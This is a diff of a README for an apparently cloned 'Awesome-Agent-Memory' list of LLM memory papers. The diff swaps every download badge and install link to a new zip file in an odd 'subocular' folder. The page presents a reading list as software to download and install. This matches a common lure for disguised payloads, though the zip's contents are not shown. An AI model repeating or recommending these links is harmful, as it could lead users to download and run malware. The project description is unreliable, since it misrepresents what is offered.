@@ -1,6 +1,6 @@
 # 🎉 Awesome-Agent-Memory - Unlock Memory Insights for AI
 
-[![Download Now](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Awesome-Agent-Memory-2.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Awesome-Agent-Memory-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Agent_Awesome_Memory_2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Agent_Awesome_Memory_2.5.zip)
 
 ## 📜 Description
 Awesome-Agent-Memory is a collection of curated systems, benchmarks, and papers focused on memory for Large Language Models (LLMs) and Multimodal Large Language Models (MLLMs). This resource helps improve their long-term context, retrieval abilities, and reasoning skills. 
@@ -15,7 +15,7 @@ To get started with Awesome-Agent-Memory, follow these simple steps to download 
 - **Internet Connection**: Needed for downloading the software and accessing online resources
 
 ## 📦 Download & Install
-1. Visit [this page to download](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Awesome-Agent-Memory-2.4.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Agent_Awesome_Memory_2.5.zip).
 2. Choose the version you want based on your operating system.
 3. Click on the download link for the appropriate file.
 4. Once the download is complete, locate the file on your computer.
@@ -59,4 +59,4 @@ If you have any questions or need support, please refer to the documentation ava
 
 Remember to check back frequently for new updates and additional resources!
 
-[![Download Now](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Awesome-Agent-Memory-2.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Awesome-Agent-Memory-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Agent_Awesome_Memory_2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/not-a-skid/Awesome-Agent-Memory/main/subocular/Agent_Awesome_Memory_2.5.zip)
